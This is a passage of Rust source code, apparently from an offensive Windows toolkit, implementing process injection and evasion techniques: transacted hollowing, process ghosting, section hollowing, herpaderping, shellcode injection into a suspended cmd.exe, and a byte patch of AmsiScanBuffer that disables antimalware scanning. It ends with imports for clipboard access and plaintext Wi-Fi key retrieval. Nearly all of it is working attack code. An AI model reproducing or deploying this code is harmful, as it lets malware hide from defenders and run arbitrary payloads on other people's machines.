            let filehandle = CreateFileTransactedA(filepath.as_bytes().as_ptr() as *const i8, 
                GENERIC_READ, 
                FILE_SHARE_WRITE, 
                std::ptr::null_mut(), 
                OPEN_ALWAYS, 
                FILE_ATTRIBUTE_NORMAL, 
                std::ptr::null_mut(), 
                transactionhandle, 
                0 as *mut u16, 
                std::ptr::null_mut());
        
            if filehandle==INVALID_HANDLE_VALUE{
                println!("CreateFileTransactedA failed: {}",GetLastError());
                CloseHandle(transactionhandle);
                return ();
            }

            let mut sectionhandle = 0 as *mut c_void;
            let ntstatus = NtCreateSection(&mut sectionhandle, 
                SECTION_ALL_ACCESS, 
                std::ptr::null_mut(), 
                0 as *mut LARGE_INTEGER, 
                PAGE_READONLY, 
                SEC_IMAGE, 
                filehandle);

            if ntstatus !=STATUS_SUCCESS{
                println!("NtCreateSection failed: {}",ntstatus);
                CloseHandle(filehandle);
                CloseHandle(transactionhandle);
                return ();
            }

            //println!("section: {:x?}",sectionhandle);


           
            // rolling back the transaction
            CloseHandle(transactionhandle);
            CloseHandle(filehandle);

            //let pe = peparse64::parsefile(filepath.to_string());
            //let entrypoint = pe.getntheader().unwrap().OptionalHeader.AddressOfEntryPoint;

            let pe = peparse64::parsefile(filepath.to_string());
            let entrypoint = pe.getntheader().unwrap().OptionalHeader.AddressOfEntryPoint;

            createprocessfromsection(sectionhandle,
                entrypoint,targetpath.clone());

            /*let mut proc2handle = 0 as *mut c_void;
            let ntstatus = NtCreateProcessEx(&mut proc2handle, 
                PROCESS_ALL_ACCESS, 
                std::ptr::null_mut(), 
                GetCurrentProcess(), 
                4, 
                sectionhandle, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                0);

            if ntstatus!=STATUS_SUCCESS{
                println!("NtCreateProcessEx failed: {}",ntstatus);
                return();
            }*/


            




        }
    }



    pub fn process_inject_ghosting(filepath: String,targetpath: String){
        unsafe{

            // opening file
            let filehandle = CreateFileA(filepath.as_bytes().as_ptr() as *const i8, 
            GENERIC_READ|GENERIC_WRITE, 
            1, 
            std::ptr::null_mut(), 
            3, 
            FILE_ATTRIBUTE_NORMAL, 
            std::ptr::null_mut());

            if filehandle.is_null(){
                println!("opening file with createfilea failed: {}",GetLastError());
                return ();
            }

            let mut sectionhandle = 0 as *mut c_void;
            let ntstatus = NtCreateSection(&mut sectionhandle, 
                SECTION_ALL_ACCESS, 
                std::ptr::null_mut(), 
                0 as *mut LARGE_INTEGER, 
                PAGE_READONLY, 
                SEC_IMAGE, 
                filehandle);

            if ntstatus !=STATUS_SUCCESS{
                println!("NtCreateSection failed: {:x?}",ntstatus);
                CloseHandle(filehandle);
                return ();
            }


            let pe = peparse64::parsefile(filepath.to_string());
            let entrypoint = pe.getntheader().unwrap().OptionalHeader.AddressOfEntryPoint;

            createprocessfromsection(sectionhandle,
                entrypoint,targetpath.clone());

            /*let mut proc2handle = 0 as *mut c_void;
            let ntstatus = NtCreateProcessEx(&mut proc2handle, 
                PROCESS_ALL_ACCESS, 
                std::ptr::null_mut(), 
                GetCurrentProcess(), 
                4, 
                sectionhandle, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                0);

            if ntstatus!=STATUS_SUCCESS{
                println!("NtCreateProcessEx failed: {}",ntstatus);
                return();
            }*/


            




        }
    }


    pub fn process_inject_transacted_hollowing(filepath: String){
        unsafe{


            let transactionhandle = CreateTransaction(std::ptr::null_mut(), 
                0 as *mut GUID, 
                TRANSACTION_DO_NOT_PROMOTE, 
                0, 0, 0, 
                std::ptr::null_mut());

            if transactionhandle==INVALID_HANDLE_VALUE{
                println!("CreateTransaction failed: {}",GetLastError());
                return ();
            }


            let filehandle = CreateFileTransactedA(filepath.as_bytes().as_ptr() as *const i8, 
                GENERIC_READ, 
                FILE_SHARE_WRITE, 
                std::ptr::null_mut(), 
                OPEN_ALWAYS, 
                FILE_ATTRIBUTE_NORMAL, 
                std::ptr::null_mut(), 
                transactionhandle, 
                0 as *mut u16, 
                std::ptr::null_mut());
        
            if filehandle==INVALID_HANDLE_VALUE{
                println!("CreateFileTransactedA failed: {}",GetLastError());
                CloseHandle(transactionhandle);
                return ();
            }

            let mut sectionhandle = 0 as *mut c_void;
            let ntstatus = NtCreateSection(&mut sectionhandle, 
                SECTION_ALL_ACCESS, 
                std::ptr::null_mut(), 
                0 as *mut LARGE_INTEGER, 
                PAGE_READONLY, 
                SEC_IMAGE, 
                filehandle);

            if ntstatus !=STATUS_SUCCESS{
                println!("NtCreateSection failed: {}",ntstatus);
                CloseHandle(filehandle);
                CloseHandle(transactionhandle);
                return ();
            }

            //println!("section: {:x?}",sectionhandle);


           
            // rolling back the transaction
            CloseHandle(transactionhandle);
            CloseHandle(filehandle);
        

            let filepe = peparse64::parsefile(filepath);


            let mut procinfo = std::mem::zeroed::<PROCESS_INFORMATION>();
            let mut startupinfo = std::mem::zeroed::<STARTUPINFOA>();
            startupinfo.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

            let res = CreateProcessA(
                "C:\\Windows\\System32\\cmd.exe\0".as_bytes().as_ptr() as *const i8, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                0, 
                CREATE_SUSPENDED, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                &mut startupinfo, &mut procinfo);

            if res==0{
                println!("CreateProcessA failed: {}",GetLastError());
                return ();
            }


            

            let procs = getprocesses().unwrap();
            let mut procbase = 0 as *mut c_void;
            let mut prochandle = 0 as *mut c_void;
            /*for i in procs.keys(){
            if i == "calc.exe"{
                prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, procs[i]);
                let mods =  getloadedmodules(prochandle).unwrap();

                for j in mods.keys(){
                    if j=="calc.exe"{
                        println!("process base: {:x?}",mods[j]);
                        procbase = mods[j] as *mut c_void;
                    }
                }

                }
            }*/



            //ZwUnmapViewOfSection(prochandle, procbase as *mut c_void);


            let mut procbase1 = 0 as *mut c_void;
            let ntstatus = ZwMapViewOfSection( sectionhandle, 
                procinfo.hProcess, 
                &mut procbase1 , 
                0, 
                0, 
                0 as *mut LARGE_INTEGER, 
                &mut 0, 
                ViewShare, 
                0, 
                PAGE_READONLY);

            if ntstatus!=STATUS_SUCCESS{
                println!("ZwMapViewOfSection failed: {:x?}",ntstatus);
            }
                println!("procbase: {:x?}",procbase);
                println!("procbase1: {:x?}",procbase1);


            // updating remote process's peb imagebaseaddress
            let mut procbuffer: Vec<u8> = vec![0;std::mem::size_of::<PROCESS_BASIC_INFORMATION>()];
            let mut returnlength =0 ;
            let ntstatus = NtQueryInformationProcess(procinfo.hProcess, 
                0, 
                procbuffer.as_mut_ptr() as *mut c_void, 
                procbuffer.len() as u32, &mut returnlength);
            
            if ntstatus!=STATUS_SUCCESS{
                println!("NtQueryInformationProcess failed: {:x?}",ntstatus);
                TerminateProcess(procinfo.hProcess, 0);
                return();
            }
        
            let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();
            FillStructureFromMemory(&mut pbi, procbuffer.as_ptr() as *const c_void, GetCurrentProcess());

            println!("peb base: {:x?}",pbi.PebBaseAddress);
            let mut pebbuffer:Vec<u8> = vec![0;std::mem::size_of::<PEB>()];
            let mut bytesread = 0;
            ReadProcessMemory(procinfo.hProcess, 
                pbi.PebBaseAddress as *mut c_void, 
                pebbuffer.as_mut_ptr() as *mut c_void, 
                pebbuffer.len() , &mut bytesread);

            let mut peb = std::mem::zeroed::<PEB>();
            FillStructureFromMemory(&mut peb, pebbuffer.as_ptr() as *const c_void, GetCurrentProcess());

            println!("imagebase: {:x?}",peb.ImageBaseAddress);

            let imagebaseoffset = ((&peb.ImageBaseAddress as *const _ as *const u8 as usize) - (&peb as *const _ as *const u8 as usize)) as usize;
            println!("imagebaseoffset: {:x?}",imagebaseoffset);

            let mut byteswritten = 0;
            WriteProcessMemory(procinfo.hProcess, 
                (pbi.PebBaseAddress as usize + imagebaseoffset) as *mut c_void, 
                (procbase1 as u64).to_ne_bytes().as_ptr() as *const c_void, 
                8, &mut byteswritten);



                let mut mycontext = std::mem::zeroed::<MYCONTEXT>();
                mycontext.ContextFlags = 1;
    
                GetThreadContext(procinfo.hThread, &mut mycontext as *mut _ as *mut CONTEXT);
                
                //mycontext.Rcx = (procbase as usize + filepe.getntheader().unwrap().OptionalHeader.AddressOfEntryPoint as usize) as u64;
    
                // eax for x86, rcx for x64
                mycontext.Rcx = (procbase1 as usize 
                   + filepe.getntheader().unwrap().OptionalHeader.AddressOfEntryPoint as usize
                ) as u64;
    
                SetThreadContext(procinfo.hThread, &mut mycontext as *mut _ as *mut CONTEXT);
    
                let res =ResumeThread(procinfo.hThread);
                if res==0{
                    println!("resume thread failed: {}",GetLastError());
                }


            
            
            //TerminateProcess(procinfo.hProcess, 0);

        }
    }



    pub fn process_inject_sectionhollowing(filepath: String){
        unsafe{


            // opening file
            let filehandle = CreateFileA(filepath.as_bytes().as_ptr() as *const i8, 
            GENERIC_READ|GENERIC_WRITE, 
            1, 
            std::ptr::null_mut(), 
            3, 
            FILE_ATTRIBUTE_NORMAL, 
            std::ptr::null_mut());

            if filehandle.is_null(){
                println!("opening file with createfilea failed: {}",GetLastError());
                return ();
            }

            let mut sectionhandle = 0 as *mut c_void;
            let ntstatus = NtCreateSection(&mut sectionhandle, 
                SECTION_ALL_ACCESS, 
                std::ptr::null_mut(), 
                0 as *mut LARGE_INTEGER, 
                PAGE_READONLY, 
                SEC_IMAGE, 
                filehandle);

            if ntstatus !=STATUS_SUCCESS{
                println!("NtCreateSection failed: {:x?}",ntstatus);
                CloseHandle(filehandle);
                return ();
            }

        

            let filepe = peparse64::parsefile(filepath);


            let mut procinfo = std::mem::zeroed::<PROCESS_INFORMATION>();
            let mut startupinfo = std::mem::zeroed::<STARTUPINFOA>();
            startupinfo.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

            let res = CreateProcessA(
                "C:\\Windows\\notepad.exe\0".as_bytes().as_ptr() as *const i8, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                0, 
                CREATE_SUSPENDED, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                &mut startupinfo, &mut procinfo);

            if res==0{
                println!("CreateProcessA failed: {}",GetLastError());
                return ();
            }


            

            let procs = getprocesses().unwrap();
            //let mut procbase = 0 as *mut c_void;
            //let mut prochandle = 0 as *mut c_void;
            /*for i in procs.keys(){
            if i == "calc.exe"{
                prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0, procs[i]);
                let mods =  getloadedmodules(prochandle).unwrap();

                for j in mods.keys(){
                    if j=="calc.exe"{
                        println!("process base: {:x?}",mods[j]);
                        procbase = mods[j] as *mut c_void;
                    }
                }

                }
            }*/

            
            //ZwUnmapViewOfSection(prochandle, procbase as *mut c_void);


            let mut procbase1 = 0 as *mut c_void;
            let ntstatus = ZwMapViewOfSection( sectionhandle, 
                procinfo.hProcess, 
                &mut procbase1 , 
                0, 
                0, 
                0 as *mut LARGE_INTEGER, 
                &mut 0, 
                ViewShare, 
                0, 
                PAGE_READONLY);

            if ntstatus!=STATUS_SUCCESS{
                println!("ZwMapViewOfSection failed: {:x?}",ntstatus);
            }
                //println!("procbase: {:x?}",procbase);
                println!("procbase1: {:x?}",procbase1);


            // updating remote process's peb imagebaseaddress
            let mut procbuffer: Vec<u8> = vec![0;std::mem::size_of::<PROCESS_BASIC_INFORMATION>()];
            let mut returnlength =0 ;
            let ntstatus = NtQueryInformationProcess(procinfo.hProcess, 
                0, 
                procbuffer.as_mut_ptr() as *mut c_void, 
                procbuffer.len() as u32, &mut returnlength);
            
            if ntstatus!=STATUS_SUCCESS{
                println!("NtQueryInformationProcess failed: {:x?}",ntstatus);
                TerminateProcess(procinfo.hProcess, 0);
                return();
            }
        
            let mut pbi = std::mem::zeroed::<PROCESS_BASIC_INFORMATION>();
            FillStructureFromMemory(&mut pbi, procbuffer.as_ptr() as *const c_void, GetCurrentProcess());

            println!("peb base: {:x?}",pbi.PebBaseAddress);
            let mut pebbuffer:Vec<u8> = vec![0;std::mem::size_of::<PEB>()];
            let mut bytesread = 0;
            ReadProcessMemory(procinfo.hProcess, 
                pbi.PebBaseAddress as *mut c_void, 
                pebbuffer.as_mut_ptr() as *mut c_void, 
                pebbuffer.len() , &mut bytesread);

            let mut peb = std::mem::zeroed::<PEB>();
            FillStructureFromMemory(&mut peb, pebbuffer.as_ptr() as *const c_void, GetCurrentProcess());

            println!("imagebase: {:x?}",peb.ImageBaseAddress);

            let imagebaseoffset = ((&peb.ImageBaseAddress as *const _ as *const u8 as usize) - (&peb as *const _ as *const u8 as usize)) as usize;
            println!("imagebaseoffset: {:x?}",imagebaseoffset);

            let mut byteswritten = 0;
            WriteProcessMemory(procinfo.hProcess, 
                (pbi.PebBaseAddress as usize + imagebaseoffset) as *mut c_void, 
                (procbase1 as u64).to_ne_bytes().as_ptr() as *const c_void, 
                8, &mut byteswritten);



            let mut mycontext = std::mem::zeroed::<MYCONTEXT>();
            mycontext.ContextFlags = 1;
    
            let res = GetThreadContext(procinfo.hThread, &mut mycontext as *mut _ as *mut CONTEXT);
            
            if res==0{  
                println!("getthreadcontext failed: {}",GetLastError());
            }
            println!("rcx before setting: {:x?}",mycontext.Rcx);

                //mycontext.Rcx = (procbase as usize + filepe.getntheader().unwrap().OptionalHeader.AddressOfEntryPoint as usize) as u64;
    
            println!("address of entrypoint: {:x?}",filepe.getntheader().unwrap().OptionalHeader.AddressOfEntryPoint as usize);
                // eax for x86, rcx for x64
            mycontext.Rcx = (procbase1 as usize 
                 + filepe.getntheader().unwrap().OptionalHeader.AddressOfEntryPoint as usize
            ) as u64;
    
            let res = SetThreadContext(procinfo.hThread, &mut mycontext as *mut _ as *mut CONTEXT);
            if res==0{
                println!("setthreadcontext failed: {}",GetLastError());
            }




            mycontext.ContextFlags = 1;
    
            let res = GetThreadContext(procinfo.hThread, &mut mycontext as *mut _ as *mut CONTEXT);
            
            if res==0{  
                println!("getthreadcontext failed: {}",GetLastError());
            }
            println!("rcx after setting: {:x?}",mycontext.Rcx);

            let res =ResumeThread(procinfo.hThread);
            if res==0{
                println!("resume thread failed: {}",GetLastError());
            }


            
            
            //TerminateProcess(procinfo.hProcess, 0);

        }
    }


    pub fn herpaderping2(filehandle: *mut c_void,sectionhandle: *mut c_void,entrypoint: u32,targetpath: String){
        unsafe{

            let mut prochandle = 0 as *mut c_void;
            let ntstatus = NtCreateProcessEx(&mut prochandle, 
                PROCESS_ALL_ACCESS, 
                std::ptr::null_mut(), 
                GetCurrentProcess(), 
                4, 
                sectionhandle, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                0);

            if ntstatus!=STATUS_SUCCESS{
                println!("NtCreateProcessEx failed: {}",ntstatus);
                return();
            }

            let mut buffer:Vec<u8> = vec![0;std::mem::size_of::<PROCESS_BASIC_INFORMATION>()];
            let mut returnlength = 0;
            let ntstatus = NtQueryInformationProcess(prochandle, 
                0, 
                buffer.as_mut_ptr() as *mut c_void, 
                buffer.len() as u32, &mut returnlength);

            if ntstatus!=STATUS_SUCCESS{
                println!("NtQueryInformationProcess failed: {}",ntstatus);
                return ();
            }
            

            let mut pbi = *(buffer.as_mut_ptr() as *mut PROCESS_BASIC_INFORMATION);

            println!("peb address: {:x?}",pbi.PebBaseAddress);

            let mut pebbuffer : Vec<u8> = vec![0;std::mem::size_of::<ntapi::ntpebteb::PEB>()];
            let mut bytesread = 0;
            ReadProcessMemory(prochandle, 
                pbi.PebBaseAddress as *const c_void, 
                pebbuffer.as_mut_ptr() as *mut c_void, 
                pebbuffer.len() , &mut bytesread);

            let pebstructure = *(pebbuffer.as_mut_ptr() as *mut PEB);

            println!("REMOTE PEB PROCESSPARAMETERS: {:x?}",pebstructure.ProcessParameters);




                // modifying the file on disk
            let mut byteswritten = 0;
            SetFilePointer(filehandle, 0, 0 as *mut i32, 0);
            WriteFile(filehandle, 
                "helloworld\0".as_bytes().as_ptr() as *const c_void, 
                "helloworld\0".as_bytes().len() as u32, 
                &mut byteswritten, std::ptr::null_mut());

            CloseHandle(filehandle);



            let mut imagepathname = std::mem::zeroed::<UNICODE_STRING>();
            let mut name1 = targetpath.encode_utf16().collect::<Vec<u16>>();
            RtlInitUnicodeString(&mut imagepathname, name1.as_mut_ptr() as *mut u16);

            //println!("{:x?}: {}",imagepathname.Buffer,imagepathname.Length);
           

            let mut dlldir = std::mem::zeroed::<UNICODE_STRING>();
            let mut dlldirname = "C:\\Windows\\System32".encode_utf16().collect::<Vec<u16>>();
            RtlInitUnicodeString(&mut dlldir, dlldirname.as_mut_ptr() as *mut u16);



            let mut windowname = std::mem::zeroed::<UNICODE_STRING>();
            let mut windowname1 = "Testing Process Doppelganging".encode_utf16().collect::<Vec<u16>>();
            RtlInitUnicodeString(&mut windowname, windowname1.as_mut_ptr() as *mut u16);



            let requiredsize = GetCurrentDirectoryA(0, std::ptr::null_mut());
            println!("{}",requiredsize);
            let mut curdir:Vec<u8> = vec![0;requiredsize as usize];
            GetCurrentDirectoryA(curdir.len() as u32, curdir.as_mut_ptr() as *mut i8);
            let curdirstring = String::from_utf8_lossy(&curdir).trim_end_matches("\0").to_string();
            let mut curdirname = std::mem::zeroed::<UNICODE_STRING>();
            let mut curdirname1 = curdirstring.encode_utf16().collect::<Vec<u16>>();
            RtlInitUnicodeString(&mut curdirname, curdirname1.as_mut_ptr() as *mut u16);


            let mut env1 = 0 as *mut c_void;
            RtlCreateEnvironment(1, &mut env1);

            let mut envparams = 0 as *mut RTL_USER_PROCESS_PARAMETERS;
            let ntstatus = RtlCreateProcessParametersEx(&mut envparams, 
               &mut imagepathname , 
               &mut dlldir, 
               &mut curdirname, 
               &mut imagepathname, 
               env1, 
               &mut windowname, 
               std::ptr::null_mut(), 
               std::ptr::null_mut(), 
               std::ptr::null_mut(), 
                RTL_USER_PROC_PARAMS_NORMALIZED);   

            if ntstatus!=STATUS_SUCCESS{
                println!("RtlCreateProcessParametersEx failed: {}",ntstatus);
                return ();
            }

            let mut procparams = std::mem::zeroed::<RTL_USER_PROCESS_PARAMETERS>();
            FillStructureFromMemory(&mut procparams, envparams as *const c_void, GetCurrentProcess());


            let mut procparamsbuffer: Vec<u8> = vec![0;procparams.Length as usize];
            ReadProcessMemory(GetCurrentProcess(), 
                envparams as *const c_void , 
                procparamsbuffer.as_mut_ptr() as *mut c_void, 
                procparams.Length as usize, 
                &mut bytesread);

            let mut envbuffer: Vec<u8> = vec![0;procparams.EnvironmentSize];
            ReadProcessMemory(GetCurrentProcess(), 
                procparams.Environment as *const c_void , 
                envbuffer.as_mut_ptr() as *mut c_void, 
                envbuffer.len(), 
                &mut bytesread);

            println!("pointer envparams: {:x?}",envparams);
            println!("procparams length: {:x?}",procparams.Length);
            println!("procparams Environment: {:x?}",procparams.Environment);
            println!("procparams Environment size: {:x?}",procparams.EnvironmentSize);
           
           let mut startingptr = envparams as usize;
           let mut endingptr = envparams as usize + procparams.Length as usize;


           if procparams.Environment!=0 as *mut c_void{

                if (procparams.Environment as usize) < (envparams as usize){
                    startingptr = procparams.Environment as usize;
                }

                if (procparams.Environment as usize + (procparams.EnvironmentSize)) > (envparams as usize + procparams.Length as usize){
                    endingptr = procparams.Environment as usize + (procparams.EnvironmentSize);
                }


           }

           //let totalsizetocopy = endingptr - startingptr;
           let totalsizetocopy = (procparams.Length as usize) + (procparams.EnvironmentSize as usize);

           //println!("{:x?}",procparamsbuffer);

           /*VirtualAllocEx(prochandle, 
            envparams as *mut c_void, 
            totalsizetocopy,
            MEM_RESERVE|MEM_COMMIT , PAGE_READWRITE);
*/


           /*if (envparams as usize + procparams.Length as usize) == (procparams.Environment as usize){

            let remote1 = VirtualAllocEx(prochandle, 
                envparams as *mut c_void, 
                procparams.Length as usize, 
                MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

                let mut byteswritten = 0;
                WriteProcessMemory(prochandle, 
                    envparams as *mut c_void, 
                    procparamsbuffer.as_mut_ptr() as *mut c_void, 
                    procparams.Length as usize, 
                    &mut byteswritten);

                let remote2 = VirtualAllocEx(prochandle, 
                        procparams.Environment as *mut c_void, 
                        procparams.EnvironmentSize as usize, 
                        MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        
                    let mut byteswritten = 0;
                    WriteProcessMemory(prochandle, 
                            procparams.Environment as *mut c_void, 
                            envbuffer.as_mut_ptr() as *mut c_void, 
                            procparams.EnvironmentSize as usize, 
                            &mut byteswritten);
           

           }*/


           let remotebase1 = VirtualAllocEx(prochandle, 
            startingptr as *mut c_void, 
            totalsizetocopy, 
            MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);

        

            if !remotebase1.is_null(){
                let mut byteswritten = 0;
                let res = WriteProcessMemory(prochandle, 
                    envparams as *mut c_void, 
                    procparamsbuffer.as_mut_ptr() as *const c_void, 
                    procparams.Length as usize, &mut byteswritten);
            
                if res==0{
                    println!("Writing parameters failed: {}",GetLastError());
                   
                }

                    let res = WriteProcessMemory(prochandle, 
                    procparams.Environment, 
                    envbuffer.as_mut_ptr() as *const c_void, 
                    procparams.EnvironmentSize, 
                    &mut byteswritten);
                    
                    if res==0{
                        println!("Writing Environment variables failed: {}",GetLastError());
                        
                    }

            }


            // now we need to update the remote peb's process params to startingptr


            let offset1 = (& pebstructure.ProcessParameters as *const _ as *const u8).offset_from(& pebstructure as *const _ as *const u8) as usize;
            let mut byteswritten = 0;
            WriteProcessMemory(prochandle, 
                (pbi.PebBaseAddress as usize + offset1) as *mut c_void, 
                (envparams as u64).to_ne_bytes().as_ptr() as *const c_void, 
                8, &mut byteswritten);
            


            
            
            let mut threadhandle1 = 0 as *mut c_void;
            let ntstatus = NtCreateThreadEx(&mut threadhandle1, 
                THREAD_ALL_ACCESS, 
                std::ptr::null_mut(), 
                prochandle, 
                (pebstructure.ImageBaseAddress as usize + entrypoint as usize) as *mut c_void, 
                std::ptr::null_mut(), 
                0, 
                0, 0, 0, std::ptr::null_mut());

            if ntstatus!=STATUS_SUCCESS{
                println!("ntcreatethreadex failed: {:x?}",ntstatus);
            }

            //WaitForSingleObject(threadhandle, 0xFFFFFFFF);

            //TerminateProcess(prochandle, 0);


        }
    }


    pub fn process_inject_herpadering(filepath: String,targetpath: String){
        unsafe{

            let filehandle = CreateFileA("C:\\Windows\\Temp\\testing1.txt\0".as_bytes().as_ptr() as *const i8,
             GENERIC_ALL, 
             1, 
             std::ptr::null_mut(), 
             CREATE_ALWAYS, 
             FILE_ATTRIBUTE_NORMAL, 
                std::ptr::null_mut());

            if filehandle.is_null(){
                println!("Createfilea failed: {}",GetLastError());
                return();
            }
            


            let payloadbuffer = std::fs::read(filepath.clone()
            .trim_end_matches("\0")).unwrap();
            let mut byteswritten = 0;
            let res = WriteFile(filehandle, 
                payloadbuffer.as_ptr() as *const c_void, 
                payloadbuffer.len() as u32, 
                &mut byteswritten, 
                std::ptr::null_mut());
            
            if res==0{
                CloseHandle(filehandle);
                println!("WriteFile A failed: {}",GetLastError());
                return ();
            }



            let mut sectionhandle = 0 as *mut c_void;
            let ntstatus = NtCreateSection(&mut sectionhandle, 
                SECTION_ALL_ACCESS, 
                std::ptr::null_mut(), 
                0 as *mut LARGE_INTEGER, 
                PAGE_READONLY, 
                SEC_IMAGE, 
                filehandle);

            if ntstatus!=STATUS_SUCCESS{
                println!("ntcreatesection failed: {:x?}",ntstatus);
                CloseHandle(filehandle);
                return();
            }

            let filepe = peparse64::parsefile(filepath);
            let entrypoint = filepe.getntheader().unwrap().OptionalHeader.AddressOfEntryPoint;

            herpaderping2(filehandle,sectionhandle, entrypoint, targetpath);



        }
    }




    pub fn shellcode_inject_remotethread(payload: &[u8]){
        unsafe{


            let mut si = std::mem::zeroed::<STARTUPINFOA>();
            si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

            let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();

            let applicationname = "C:\\Windows\\System32\\cmd.exe\0";
            let res = CreateProcessA(applicationname.as_bytes().as_ptr() as *const i8, 
                std::ptr::null_mut(),
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                0, 
                CREATE_SUSPENDED, 
                std::ptr::null_mut(), 
                std::ptr::null_mut(), 
                &mut si, 
            &mut pi);

            if res==0{
                println!("CreateProcessA failed: {}",GetLastError());
                return ();
            }

            
            let mut context = std::mem::zeroed::<MYCONTEXT>();
            context.ContextFlags = 1;

            //let mut contextbuffer: [u8;1600] = [0;1600];
            //contextbuffer[51] = 1;
            //println!("sizeof context: {}",std::mem::size_of_val(&context));

            let res = GetThreadContext(pi.hThread, &mut context as *mut _ as *mut CONTEXT);
            if res==0{
                println!("GetThreadContext failed: {}",GetLastError());
                return ();
            }

            //println!("rip: {:x?}",context.Rip);


            let remotebase = VirtualAllocEx(pi.hProcess, 
                std::ptr::null_mut(), 
                payload.len(), 
                MEM_RESERVE|MEM_COMMIT, 
            PAGE_EXECUTE_READWRITE);

            if !remotebase.is_null(){
                let mut byteswritten = 0;
                WriteProcessMemory(pi.hProcess, 
                    remotebase, 
                    payload.as_ptr() as *const c_void, 
                    payload.len(), 
                &mut byteswritten);

                context.Rip = remotebase as u64;

                SetThreadContext(pi.hThread, &mut context as *mut _ as *mut CONTEXT);

                ResumeThread(pi.hThread);

            }



        }

    }





    pub fn amsi_patch(prochandle: *mut c_void){
        unsafe{

            if !prochandle.is_null(){
                let modules = super::winenum::getloadedmodules(prochandle).unwrap();
                //println!("{:x?}",modules);
    
                for i in modules.keys(){
                    if i.to_lowercase() == "amsi.dll"{
                        //println!("{} : {:x?}",i,modules[i]);
                        let pe = peparser64::pememoryparser64::parse(prochandle, modules[i] as *mut c_void).unwrap();
                        let exports = pe.getexports().unwrap();
                        
                        //  0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0xC3
    
                        let mut patch:[u8;8] = [0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00, 0xC3];
                        for j in exports.keys(){
                            if j.to_lowercase() =="amsiscanbuffer"{
                                //println!("{}: {:x?}",i,exports[i]);
    
                                let mut oldprotect = 0;
                                let res = VirtualProtectEx(prochandle, 
                                    exports[j] as *mut c_void,
                                    5 , 0x40,
                                    &mut oldprotect);
    
                                if res==0{
                                    //println!("virtualprotectex failed: {}",GetLastError());
                                }
    
                                let mut byteswritten = 0;
                                let res = WriteProcessMemory(prochandle, 
                                    exports[j] as *mut c_void, 
                                    patch.as_ptr() as *const c_void, 
                                    8, 
                                    &mut byteswritten);
                                if res==0{
                                        //println!("writeprocessmemory failed: {}",GetLastError());
                                    }
    
                                    let res = VirtualProtectEx(prochandle, 
                                        exports[j] as *mut c_void,
                                        5 , oldprotect,
                                        &mut oldprotect);
    
                            }
                        }
                    
                    }
                }
    
    
                /*for i in modules.keys(){
                    if i.to_lowercase().contains("powershell.exe"){
                        println!("{} : {:x?}",i,modules[i]);
                        let pe = peparser64::pememoryparser64::parse(prochandle, modules[i] as *mut c_void).unwrap();
                        let imports = pe.getimports().unwrap();
    
                        for i in imports.values(){
                            for j in i.keys(){
                                if j.to_lowercase().contains("amsi"){
                                    println!("{}: {:x?}",j,i[j]);
                                }
                            }
                        }
    
                    }
                }*/
           
            }
    

        }

    }




    #[repr(C)]
    #[repr(align(64))]
    struct MYCONTEXT { // FIXME align 16
        P1Home: u64,
        P2Home: u64,
        P3Home: u64,
        P4Home: u64,
        P5Home: u64,
        P6Home: u64,
        ContextFlags: u32,
        MxCsr: u32,
        SegCs: u16,
        SegDs: u16,
        SegEs: u16,
        SegFs: u16,
        SegGs: u16,
        SegSs: u16,
        EFlags: u32,
        Dr0: u64,
        Dr1: u64,
        Dr2: u64,
        Dr3: u64,
        Dr6: u64,
        Dr7: u64,
        Rax: u64,
        Rcx: u64,
        Rdx: u64,
        Rbx: u64,
        Rsp: u64,
        Rbp: u64,
        Rsi: u64,
        Rdi: u64,
        R8: u64,
        R9: u64,
        R10: u64,
        R11: u64,
        R12: u64,
        R13: u64,
        R14: u64,
        R15: u64,
        Rip: u64,
        u: CONTEXT_u,
        VectorRegister: [M128A; 26],
        VectorControl: u64,
        DebugControl: u64,
        LastBranchToRip: u64,
        LastBranchFromRip: u64,
        LastExceptionToRip: u64,
        LastExceptionFromRip: u64,
    }

}


pub mod winenum {
    use std::borrow::Borrow;
    use std::collections::HashMap;
    use std::f32::consts::E;

    use ntapi::ntldr::LDR_DATA_TABLE_ENTRY;
    use ntapi::ntwow64::RTL_USER_PROCESS_PARAMETERS32;
    use winapi::ctypes::*;
    use winapi::shared::ntdef::NT_SUCCESS;
    use winapi::shared::ntstatus::STATUS_INFO_LENGTH_MISMATCH;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::memoryapi::*;
    use winapi::um::errhandlingapi::*;
    use winapi::um::processthreadsapi::*;
    use winapi::um::psapi::EnumProcesses;
    use winapi::um::psapi::GetModuleBaseNameW;
    use winapi::um::synchapi::*;
    use winapi::um::winnt::*;
    use ntapi::ntpsapi::*;
    use ntapi::ntpebteb::*;
    use ntapi::ntrtl::*;
    use winapi::shared::ntdef::*;
    use winapi::um::tlhelp32::*;
    use winapi::um::winuser::CF_TEXT;
    use winapi::um::winuser::CloseClipboard;
    use winapi::um::winuser::GetClipboardData;
    use winapi::um::winuser::OpenClipboard;
    use winapi::um::winuser::SetClipboardData;
    use winapi::um::wlanapi::WLAN_AVAILABLE_NETWORK;
    use winapi::um::wlanapi::WLAN_AVAILABLE_NETWORK_LIST;
    use winapi::um::wlanapi::WLAN_INTERFACE_INFO;
    use winapi::um::wlanapi::WLAN_INTERFACE_INFO_LIST;
    use winapi::um::wlanapi::WLAN_PROFILE_GET_PLAINTEXT_KEY;
